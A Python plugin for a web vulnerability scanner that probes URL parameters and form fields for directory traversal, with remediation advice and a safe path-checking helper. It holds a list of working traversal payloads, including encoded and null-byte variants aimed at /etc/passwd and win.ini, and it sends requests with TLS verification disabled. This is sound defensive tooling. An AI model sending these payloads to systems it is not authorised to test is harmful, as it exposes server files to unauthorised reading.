"""
Directory Traversal vulnerability scanner plugin.
Tests for path traversal vulnerabilities.
OWASP A01:2021 - Broken Access Control
"""

from typing import List, Any
from urllib.parse import urljoin, quote

from plugins.base_plugin import BasePlugin
from core.models import Finding, ScanTarget, OWASPCategory, Severity


class DirectoryTraversalScanner(BasePlugin):
    """Directory Traversal vulnerability scanner."""
    
    name = "Directory Traversal Scanner"
    description = "Detects path traversal vulnerabilities"
    version = "1.0.0"
    owasp_category = OWASPCategory.A01_BROKEN_ACCESS_CONTROL
    
    # Path traversal payloads
    PAYLOADS = [
        # Unix
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
        ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
        ("/etc/passwd", "root:"),
        ("....\\....\\....\\etc\\passwd", "root:"),
        
        # Windows
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]"),
        ("..%5C..%5C..%5Cwindows%5Cwin.ini", "[fonts]"),
        ("C:\\Windows\\win.ini", "[fonts]"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost"),
        
        # Null byte (legacy)
        ("../../../etc/passwd%00", "root:"),
        ("../../../etc/passwd%00.jpg", "root:"),
    ]
    
    def __init__(self):
        super().__init__()
        self.session = None
    
    def _test_parameter(self, url: str, param_name: str, method: str = 'GET', 
                        all_params: dict = None) -> List[Finding]:
        """Test a parameter for directory traversal."""
        findings = []
        
        for payload, expected in self.PAYLOADS:
            if self.is_cancelled:
                break
            
            try:
                test_params = all_params.copy() if all_params else {}
                test_params[param_name] = payload
                
                if method.upper() == 'POST':
                    response = self.session.post(url, data=test_params, 
                                                  timeout=self.timeout, verify=False)
                else:
                    response = self.session.get(url, params=test_params, 
                                                 timeout=self.timeout, verify=False)
                
                if expected.lower() in response.text.lower():
                    finding = Finding(
                        title=f"Directory Traversal in '{param_name}'",
                        description=(
                            f"Path traversal vulnerability in '{param_name}'. "
                            "Attackers can read arbitrary files from the server."
                        ),
                        severity=Severity.HIGH,
                        owasp_category=self.owasp_category,
                        affected_url=url,
                        evidence=f"File content detected with payload: {payload[:50]}",
                        payload_used=payload,
                        impact=8.0, exploitability=8.0, exposure=9.0, confidence=0.95,
                        references=["https://owasp.org/Top10/A01_2021-Broken_Access_Control/"]
                    )
                    findings.append(finding)
                    break
            except Exception:
                pass
        
        return findings
    
    def run(self, target: ScanTarget, session: Any = None) -> List[Finding]:
        """Run directory traversal scan."""
        self.findings = []
        self.session = session or __import__('requests').Session()
        
        self.report_progress("Starting Directory Traversal scan", 0)
        
        # Test URL parameters
        total = len(target.url_parameters) + len(target.forms)
        current = 0
        
        for param in target.url_parameters:
            if self.is_cancelled:
                break
            current += 1
            self.report_progress(f"Testing param: {param.name}", (current/max(total,1))*100)
            for f in self._test_parameter(param.url.split('?')[0], param.name):
                self.add_finding(f)
        
        for form in target.forms:
            if self.is_cancelled:
                break
            current += 1
            form_data = {f.name: f.value or 'test' for f in form.fields}
            for field in form.fields:
                if field.field_type in ('submit', 'button', 'hidden'):
                    continue
                for f in self._test_parameter(form.action, field.name, form.method, form_data):
                    self.add_finding(f)
        
        self.report_progress("Directory Traversal scan complete", 100)
        return self.findings
    
    def get_remediation(self, finding: Finding) -> str:
        return """
## Remediation for Directory Traversal

1. **Validate and sanitize input** - Remove or reject path traversal sequences
2. **Use allowlists** - Only allow specific, known-safe filenames
3. **Use canonical paths** - Resolve the final path and verify it's within allowed directory
4. **Chroot/Jail** - Restrict file system access at OS level

```python
import os

def safe_file_access(user_input, base_dir):
    # Resolve to absolute path
    requested = os.path.realpath(os.path.join(base_dir, user_input))
    # Verify it's within base directory
    if not requested.startswith(os.path.realpath(base_dir)):
        raise ValueError("Access denied")
    return requested
```
"""
